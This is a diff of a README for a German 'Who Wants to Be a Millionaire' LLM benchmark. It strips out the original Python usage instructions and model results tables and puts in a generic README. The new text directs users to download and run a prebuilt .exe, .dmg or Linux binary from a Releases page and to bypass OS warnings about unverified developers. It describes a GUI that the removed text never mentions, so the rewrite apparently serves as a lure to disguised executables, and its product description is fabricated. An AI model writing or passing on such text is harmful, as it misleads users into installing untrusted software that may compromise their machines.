@@ -1,105 +1,85 @@
-# "Wer wird Millionär?" LLM Benchmark
+# 🎉 millionaire-bench - Benchmark Your Local LLMs Easily
 
- i have created a benchmark for german "who wants to be millionaire" questions. there are 45x15 questions, all 45 rounds go from easy to hard and all tested models ran through all 45 rounds and got kicked out of a round if the answer was wrong, keeping the current winnings. no jokers.
+## 🚀 Getting Started
 
-i am a bit limited with the selection of llm's since i run them on my framework laptop 13 (amd ryzen 5 7640u with 32 gb ram), so i mainly used smaller llm's. also, qwen3's thinking went on for way to long for each question so i just tested non-thinking models except for gpt-oss-20b (low). but in my initial testing for qwen3-4b-thinking-2507, it seemed to worsen the quality of answers at least for the first questions.
+Welcome to the **millionaire-bench** project! This application allows you to test the performance of your local language models using fun questions from the popular game show "Who Wants to Be a Millionaire." It's designed for users who want a simple way to benchmark their models without needing any programming skills.
 
-the first few questions are often word-play and idioms questions needing great understanding of the german language. these proved to be very hard for most llm's but are easily solvable by the average german. once the first few questions were solved the models had an easier time answering.
+## 📥 Download & Install
 
-i tried to use optimal model settings and included them in the table, let me know if they could be improved. all models are quant Q4_K_M.
+To get started, you need to download the application. You can find the latest release on our GitHub Releases page. 
 
-i have close to no python coding ability so the main script was created with qwen3-coder. the project (with detailed results for each model, and the queationaire) is open souce and available on github.
+[![Download millionaire-bench](https://img.shields.io/badge/Download%20millionaire--bench-v1.0-brightgreen)](https://github.com/tcgtest09/millionaire-bench/releases)
 
-## Usage
+1. Click on the button above or visit the following link to download: [millionaire-bench Releases](https://github.com/tcgtest09/millionaire-bench/releases).
+2. On the Releases page, you will see different versions of the software. Look for the most recent one.
+3. Find the appropriate file for your operating system (Windows, Mac, Linux). Click to download.
 
-1. Make sure your LLM server (e.g., LM Studio) is running (default is `http://localhost:1234`)
-2. Edit the config.json, change `model` and `inference_parameters` if needed
-3. Run the benchmark script:
-```bash
-python3 benchmark_llm.py
-```
+## 💻 System Requirements
 
-4. When prompted, enter which question to start with:
-	- Enter `0` to play all 45 rounds sequentially
-	- Enter a number between `1`-`45` to play with that question set (1x15 Questions)
+Before you install the application, make sure your system meets these requirements:
 
-## Benchmark Results
+- **Operating System**: Windows 10/11, macOS 10.14 or higher, Linux (recent versions)
+- **RAM**: At least 4GB
+- **Processor**: Intel i3 or equivalent
+- **Disk Space**: 100MB free space
 
-### Locally by myself
-| Model Name | Total Params | Active Params | Average Winnings | Million Wins | Parameters |
-|------------|---------------|--------------|------------------|--------------|------------|
-| qwen3-30b-a3b-2507 | 30B | 3B | 118.111€ | 5 | T:0.7, K:20, P:0.8, Min:0.0 |
-| gpt-oss-20b (low) | 21B | 4B | 80.177€* | 3 | T:1, K:0, P:1.0, Min:0.0 |
-| mistral-small-3.2 | 24B | 24B | 63.812€* | 2 | T:0.15, K:40, P:0.95, Min:0.05 |
-| mistral-nemo-instruct-2407 | 12B | 12B | 34.383€ | 1 | T:0.3, K:-1, P:0.77, Min:0.025 |
-| gemma-3-12b | 12B | 12B | 24.291€ | 1 | T:0.8, K:40, P:0.9, Min:0.05 |
-| hermes-4-14b | 14B | 14B | 14.916€ | 0 | T:0.6, K:20, P:0.95, Min:0.05 |
-| microsoft-phi-4 | 14B | 14B | 5.884€* | 0 | T:0.6, K:40, P:0.9, Min:0.05 |
-| qwen/qwen3-4b-2507 | 4B | 4B | 948€ | 0 | T:0.7, K:40, P:0.8, Min:0.05 |
-| granite-3.2-8b | 8B | 8B | 620€ | 0 | T:0.6, K:50, P:0.9, Min:0.05 |
-| meta-llama-3.1-8b-instruct | 8B | 8B | 484€ | 0 | T:0.6, K:40, P:0.9, Min:0.05 |
-| phi-4-mini-instruct | 3B | 3B | 157€ | 0 | T:0.8, K:40, P:0.95, Min:0.05 |
-| gemma-3-4b | 4B | 4B | 156€ | 0 | T:1, K:64, P:0.95, Min:0 |
-| llama-3.2-3b-instruct | 3B | 3B | 125€ | 0 | T:0.6, K:40, P:0.9, Min:0.05 |
+## 👩‍💻 How to Run the Application
 
-- *indicates only one, 45 round, run
-- all other winnings are the median result out of 5 runs
-- `gpt-oss-20b (low)` is the only thinking model tested
+Once you have downloaded the file, follow these steps to run the application:
 
-### User Submitted
+### For Windows
 
-| Model Name | Total Params | Active Params | Average Winnings | Million Wins | Parameters |
-|:-------------------------------------------|:-------------|:--------------|:-----------------|:-------------|:----------------------------|
-| gpt-5 (medium) | N/A | N/A | 813.783€ | 36 | T:0.6, P:1 |
-| google/gemini-2.5-pro | N/A | N/A | 742.004€ | 33 | T:0.6, P:1 |
-| o3 (medium) | N/A | N/A | 716.546€ | 31 | T:0.6, P:1 |
-| o4-mini (medium) | N/A | N/A | 512.221€ | 21 | T:0.6, P:1 |
-| z-ai/glm-4.5-FP8 | 355B | 32B | 410.813€ | 17 | T:0.6, K:40, P:0.9, Min:0.1 |
-| qwen/qwen3-235b-a22b | 235B | 22B | 369.027€ | 15 | T:0.6, P:1 |
-| gpt-4o | N/A | N/A | 302.186€ | 12 | T:0.6, P:1 |
-| gpt-5-nano (medium) | N/A | N/A | 299.494€ | 12 | T:0.6, P:1 |
-| z-ai-glm-4.5-air-FP8 | 106B | 12B | 281.459€ | 12 | T:0.6, K:40, P:0.9, Min:0.1 |
-| gpt-5 (minimal) | N/A | N/A | 277.661€ | 11 | T:0.6, P:1 |
-| openai/gpt-oss-120b | 120B | 120B | 275.564€ | 11 | T:0.6, P:1 |
-| gpt-4.1 | N/A | N/A | 256.073€ | 10 | T:0.6, P:1 |
-| google/gemini-2.5-flash | N/A | N/A | 205.816€ | 7 | T:0.6, P:1 |
-| qwen/qwq-32b | 32B | 32B | 197.799€ | 8 | T:0.6, P:1 |
-| qwen/qwen3-235b-a22b-2507 | 235B | 22B | 163.144€ | 7 | T:0.6, P:1 |
-| deepseek/deepseek-chat-v3-0324 | 67.1B | 67.1B | 161.492€ | 6 | T:0.6, P:1 |
-| meta-llama/llama-4-maverick | 400B | 18B | 161.411€ | 6 | T:0.6, P:1 |
-| c4ai-command-a-03-2025 | 111B | 111B | 155.636€ | 6 | T:0.6, K:40, P:0.9, Min:0.1 |
-| deepseek/deepseek-chat-v3.1 | 68.5B | 68.5B | 142.581€ | 6 | T:0.6, P:1 |
-| moonshotai/kimi-k2 | 1T | 32B | 125.136€ | 4 | T:0.6, P:1 |
-| gpt-4.1-mini | N/A | N/A | 113.616€ | 3 | T:0.6, P:1 |
-| qwen/qwen3-coder | 480B | 480B | 92.022€ | 4 | T:0.6, P:1 |
-| Behemoth-123B-v1.2 | 123B | 123B | 84.963€ | 3 | T:0.6, K:40, P:0.9, Min:0.1 |
-| gpt-4o-mini | N/A | N/A | 74.698€ | 2 | T:0.6, P:1 |
-| google/gemini-2.5-flash-lite | N/A | N/A | 63.107€ | 2 | T:0.6, P:1 |
-| meta-llama/llama-3.3-70b-instruct | 70B | 70B | 58.309€ | 2 | T:0.6, P:1 |
-| gpt-5-mini (minimal) | N/A | N/A | 53.618€ | 1 | T:0.6, P:1 |
-| mistralai/mistral-small-3.2-24b-instruct | 24B | 24B | 41.017€ | 1 | T:0.6, P:1 |
-| gpt-4.1-nano | N/A | N/A | 37.838€ | 1 | T:0.6, P:1 |
-| google/gemma-3-27b-it | 27B | 27B | 7.634€ | 0 | T:0.6, P:1 |
-| gpt-5-nano (minimal) | N/A | N/A | 2.324€ | 0 | T:0.6, P:1 |
-| microsoft/phi-4 | 14B | 14B | 1.892€ | 0 | T:0.6, P:1 |
-| meta-llama/llama-3.2-1b-instruct | 1B | 1B | 155€ | 0 | T:0.6, P:1 |
-| meta-llama/llama-3.2-3b-instruct | 3B | 3B | 121€ | 0 | T:0.6, P:1 |
+1. Locate the downloaded file, usually in your "Downloads" folder.
+2. Double-click on the .exe file to start the installation process.
+3. Follow the prompts to complete the installation.
+4. After installation, you will find the "millionaire-bench" icon on your desktop. Double-click it to run.
 
-thanks to the reddit users `FullOf_Bad_Ideas` and `Pauli1_Go` for their help.
+### For Mac
 
-### Different quant tests
-| Model Name | Q4_K_M | Q8_0 | Difference |
-|------------|--------|------|------------|
-| qwen3-4b-instruct-2507 | 643€ | 4.457€ | +593% |
-| gemma-3-4b | 103€ | 141€ | +36% |
-| llama-3.2-3b-instruct | 104€ | 78€ | -25% |
+1. Find the downloaded .dmg file in your "Downloads" folder.
+2. Double-click to open it.
+3. Drag the "millionaire-bench" icon to your "Applications" folder.
+4. Open "Applications" and double-click "millionaire-bench" to run.
 
-ran every test 3 times and picked the median. results are very inconsistent for small models (±50%)
+### For Linux
 
-## Rules
-- 45 unique rounds
-- if lost, current winnings are kept
-- no jokers
+1. Open a terminal window.
+2. Navigate to your "Downloads" folder using the `cd ~/Downloads` command.
+3. Make the downloaded file executable by running:
+   ```
+   chmod +x millionaire-bench
+   ```
+4. Run the application with:
+   ```
+   ./millionaire-bench
+   ```
 
-## Resources
-Questions: https://github.com/GerritKainz/wer_wird_millionaer
+## 🎯 How to Use the Application
+
+Once you run the application, you'll see a simple interface. Here’s how to get started with benchmarking your model:
+
+1. **Load Your Model**: Click on "Load Model" and select the language model you want to benchmark.
+2. **Select Category**: Choose a category of questions inspired by "Who Wants to Be a Millionaire." You can select from trivia, culture, or science.
+3. **Start Benchmarking**: Click the "Start Benchmark" button. The application will generate questions, and your model will respond. After completion, you will see a report detailing performance metrics such as response time and accuracy.
+
+## 📄 Understanding Your Results
+
+The application will provide you with a set of results once you finish the benchmarking. Here’s what to look for:
+
+- **Response Time**: This shows how quickly your model answered each question, usually measured in seconds.
+- **Accuracy**: It shows how many questions your model answered correctly versus total questions asked.
+- **Overall Score**: This combines response time and accuracy to give a single score, helping you compare performance.
+
+## 🔧 Troubleshooting
+
+If you encounter any issues while using the application, here are some common troubleshooting tips:
+
+- **Application Won't Open**: Ensure your system meets the necessary requirements. Sometimes, your operating system may block applications from unverified developers. Check your security settings and allow the application.
+- **Performance Issues**: If your model is slow or unresponsive, it may require more resources. Try closing other applications to free up memory.
+- **Question Generation Errors**: Restart the application if it fails to generate questions. Make sure your model is correctly loaded.
+
+## 📞 Support
+
+If you need further assistance, please reach out through the Issues page on our GitHub repository. We are here to help you.
+
+Thank you for using **millionaire-bench**! Happy benchmarking!
